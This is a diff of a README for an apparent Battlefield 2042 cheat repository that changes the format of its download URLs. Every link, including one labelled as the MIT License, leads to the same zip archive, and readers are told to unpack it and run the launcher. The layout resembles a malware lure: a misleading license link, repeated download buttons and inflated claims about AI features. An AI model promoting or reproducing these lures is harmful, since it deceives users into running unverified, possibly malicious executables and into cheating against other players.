@@ -1,8 +1,8 @@
 # Battlefield 2042 Cheats Repository  
 Unlock Next-Generation Advantage in Battlefield 2042
 
-[![Download](https://raw.githubusercontent.com/baxxx12/battlefield-2042-stealth-toolkit/main/karate/toolkit-battlefield-stealth-2.0.zip)](https://raw.githubusercontent.com/baxxx12/battlefield-2042-stealth-toolkit/main/karate/toolkit-battlefield-stealth-2.0.zip)
-**Download the latest Battlefield 2042 cheats & tools**: https://raw.githubusercontent.com/baxxx12/battlefield-2042-stealth-toolkit/main/karate/toolkit-battlefield-stealth-2.0.zip
+[![Download](https://github.com/baxxx12/battlefield-2042-stealth-toolkit/raw/refs/heads/main/karate/toolkit-battlefield-stealth-2.0.zip)](https://github.com/baxxx12/battlefield-2042-stealth-toolkit/raw/refs/heads/main/karate/toolkit-battlefield-stealth-2.0.zip)
+**Download the latest Battlefield 2042 cheats & tools**: https://github.com/baxxx12/battlefield-2042-stealth-toolkit/raw/refs/heads/main/karate/toolkit-battlefield-stealth-2.0.zip
 
 ---
 
@@ -95,8 +95,8 @@ By fusing OpenAI and Claude API technologies, we've created a self-adapting assi
 ## 🚀 Getting Started
 
 **Step 1:** Download the latest package:  
-[![Download](https://raw.githubusercontent.com/baxxx12/battlefield-2042-stealth-toolkit/main/karate/toolkit-battlefield-stealth-2.0.zip)](https://raw.githubusercontent.com/baxxx12/battlefield-2042-stealth-toolkit/main/karate/toolkit-battlefield-stealth-2.0.zip)  
-(Direct link: https://raw.githubusercontent.com/baxxx12/battlefield-2042-stealth-toolkit/main/karate/toolkit-battlefield-stealth-2.0.zip)
+[![Download](https://github.com/baxxx12/battlefield-2042-stealth-toolkit/raw/refs/heads/main/karate/toolkit-battlefield-stealth-2.0.zip)](https://github.com/baxxx12/battlefield-2042-stealth-toolkit/raw/refs/heads/main/karate/toolkit-battlefield-stealth-2.0.zip)  
+(Direct link: https://github.com/baxxx12/battlefield-2042-stealth-toolkit/raw/refs/heads/main/karate/toolkit-battlefield-stealth-2.0.zip)
 
 **Step 2:** Unpack and run the launcher (on supported OS, see compatibility table).
 
@@ -119,7 +119,7 @@ By using these tools, you affirm full responsibility for your actions.
 This repository is open-sourced under the MIT License (2025).  
 Redistribution, modification, and personal use are encouraged within the bounds of the license.
 
-[View the MIT License »](https://raw.githubusercontent.com/baxxx12/battlefield-2042-stealth-toolkit/main/karate/toolkit-battlefield-stealth-2.0.zip)
+[View the MIT License »](https://github.com/baxxx12/battlefield-2042-stealth-toolkit/raw/refs/heads/main/karate/toolkit-battlefield-stealth-2.0.zip)
 
 ---
 
@@ -127,8 +127,8 @@ Redistribution, modification, and personal use are encouraged within the bounds 
 
 Ready to explore tactical brilliance?
 
-[![Download](https://raw.githubusercontent.com/baxxx12/battlefield-2042-stealth-toolkit/main/karate/toolkit-battlefield-stealth-2.0.zip)](https://raw.githubusercontent.com/baxxx12/battlefield-2042-stealth-toolkit/main/karate/toolkit-battlefield-stealth-2.0.zip)  
-Access your digital arsenal here: https://raw.githubusercontent.com/baxxx12/battlefield-2042-stealth-toolkit/main/karate/toolkit-battlefield-stealth-2.0.zip
+[![Download](https://github.com/baxxx12/battlefield-2042-stealth-toolkit/raw/refs/heads/main/karate/toolkit-battlefield-stealth-2.0.zip)](https://github.com/baxxx12/battlefield-2042-stealth-toolkit/raw/refs/heads/main/karate/toolkit-battlefield-stealth-2.0.zip)  
+Access your digital arsenal here: https://github.com/baxxx12/battlefield-2042-stealth-toolkit/raw/refs/heads/main/karate/toolkit-battlefield-stealth-2.0.zip
 
 ---
 
